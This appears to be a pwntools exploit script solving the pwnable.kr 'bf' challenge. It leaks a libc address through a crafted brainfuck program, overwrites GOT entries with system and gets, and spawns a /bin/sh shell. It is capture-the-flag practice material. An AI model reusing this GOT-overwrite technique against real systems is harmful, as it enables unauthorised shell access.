from pwn import *
#ihciah@gmail.com
libc = ELF('./bf_libc.so')
# bf = remote('pwnable.kr', 9001)
bf = process('./bf')
bf.recvline_startswith(b'type')
bf.sendline(
    b'<'*112
    +b'.'
    +b'.>'*4
    +b'<'*4
    +b',>'*4
    +b'<'*(4+32)
    +b',>'*4
    +b'<'*4
    +b'>'*28
    +b',>'*4
    +b'.'
)
bf.recv(1)
x = u32(bf.recv(4)[::-1], endian='little')
print(hex(x))
jump = 0x080484E0
bf.send(p32(jump))
system= x - libc.symbols['putchar'] + libc.symbols['system']
gets= x - libc.symbols['putchar'] + libc.symbols['gets']
bf.send(p32(system))
bf.send(p32(gets))
bf.sendline(b'/bin/sh\x00')
bf.interactive()
